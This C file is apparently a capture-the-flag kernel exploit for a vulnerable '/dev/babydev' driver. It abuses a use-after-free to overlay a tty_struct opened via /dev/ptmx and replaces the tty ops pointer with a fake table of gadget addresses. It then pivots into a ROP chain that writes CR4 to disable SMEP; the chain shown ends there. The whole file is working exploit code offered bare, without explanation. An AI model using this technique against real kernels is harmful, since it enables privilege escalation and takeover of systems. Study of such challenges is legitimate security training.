#include <stdio.h>
#include <fcntl.h>

typedef unsigned long long  uint64;

void * fake_ops[0x34];
void * rop[0x100];

int main(){
    int fd1 = open("/dev/babydev", O_RDWR);
    if (fd1<0){
        printf("open /dev/babydev error\n");
        exit(-1);
    }
    int fd2 = open("/dev/babydev", O_RDWR);
    if (fd2<0){
        printf("open /dev/babydev error\n");
        exit(-1);
    }
    ioctl(fd1, 0x10001, 0x2e0);
    printf("set chunk size = 0x2e0 = sizeof(struct tty_struct)\n");
    close(fd1);
    //printf("close fd1, free chunk\n");

    int tty = open("/dev/ptmx", O_RDWR);
    if(tty<0){
        printf("open /dev/ptmx error\n");
        exit(-1);
    }

    // rop 
    int i = 0;
    rop[i++] = 0; 
    rop[i++] = 0xffffffff810d238d; // pop rdi; ret;
    rop[i++] = 0x6f0;
    rop[i++] = 0xffffffff81004d80; // mov cr4, rdi; pop rbp; ret;
    rop[i++] = 0;


    // fake_ops
    for (int i=0; i<0x34; i++){
        fake_ops[i] = 0xffffffff81110c15; // ret;
    }

    fake_ops[0] = 0xffffffff8100202b;// pop rbp; ret;
    fake_ops[1] = rop;
    fake_ops[2] = 0xffffffff81002e44; // leave; ret;

    // ops->write 
    fake_ops[7] = 0xffffffff8181bfc5; // mov rax, rsp; dec ebx; ret;


    uint64 fake_tty[4];
    read(fd2, fake_tty, 0x20);
    // tty->ops
    fake_tty[3] = (uint64)fake_ops;
    write(fd2, fake_tty, 0x20);

    char buf[0x8] = {0};
    write(tty, buf, 0x8);

    return 0;
}
